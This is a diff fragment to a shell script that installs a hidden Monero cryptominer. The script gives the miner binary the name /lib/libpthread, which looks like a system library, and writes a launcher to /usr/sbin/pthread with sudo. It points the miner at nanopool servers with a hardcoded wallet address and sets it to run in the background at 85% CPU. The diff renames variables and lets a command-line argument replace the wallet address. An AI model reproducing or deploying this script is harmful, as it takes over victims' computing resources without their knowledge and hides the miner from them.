@@ -57,13 +57,13 @@ if [ ! -f "/usr/lib64/libuv.so.1" ]; then
 else
     echo "libuv 1.x installed"
 fi
-WokerID="$RANDOM"
-myAddress="4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb"
+WOKER_ID="$RANDOM"
+DEPOSIT_ADDRESS="4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb"
 if [ x$1 != x ]
 then
-    $COMMANDLINE=$1
+    DEPOSIT_ADDRESS=$1
 fi
-COMMANDLINE="nice -n 19 /lib/libpthread -o xmr-us-west1.nanopool.org:14444 -u $myAddress.$WokerID -p x -k -o xmr-eu1.nanopool.org:14444 -u $myAddress.BAK_$WokerID -p x -k --max-cpu-usage=85 --background"
+COMMANDLINE="nice -n 19 /lib/libpthread -o xmr-us-west1.nanopool.org:14444 -u $DEPOSIT_ADDRESS.$WOKER_ID -p x -k -o xmr-eu1.nanopool.org:14444 -u $DEPOSIT_ADDRESS.BAK_$WOKER_ID -p x -k --max-cpu-usage=85 --background"
 echo $COMMANDLINE
 sudo echo  $COMMANDLINE> /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
